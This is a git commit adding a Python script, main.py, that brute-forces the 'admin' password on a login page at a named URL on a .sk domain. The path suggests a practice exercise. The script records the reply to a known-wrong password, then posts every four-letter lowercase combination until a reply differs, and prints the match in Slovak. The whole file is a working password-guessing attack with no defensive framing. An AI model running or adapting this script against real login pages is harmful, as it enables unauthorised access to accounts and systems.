d27c1ac6c1000886f42cb44ab30679603aec18f9
Stlpikjunior <113450933+Stlpikjunior@users.noreply.github.com>
2024-01-17 20:49:04 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,25 @@
+import requests
+
+url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
+lett = ('zyxwvutsrqponmlkjihgfedcba')
+
+inv = requests.post(url, data = {'username':'admin', 'password':'INVA'})
+inv = inv.text
+passsword = 'nezname'
+
+
+def brute_force():
+    for a in lett:
+        for b in lett:
+            for c in lett:
+                for d in lett:
+                    heslo = str(a+b+c+d)
+                    data = {'username': 'admin',
+                            'password': heslo}
+                    r = requests.post(url, data=data)
+                    r = r.text
+                    if r!=inv:
+                        print('heslo je', heslo)
+                        return heslo
+
+
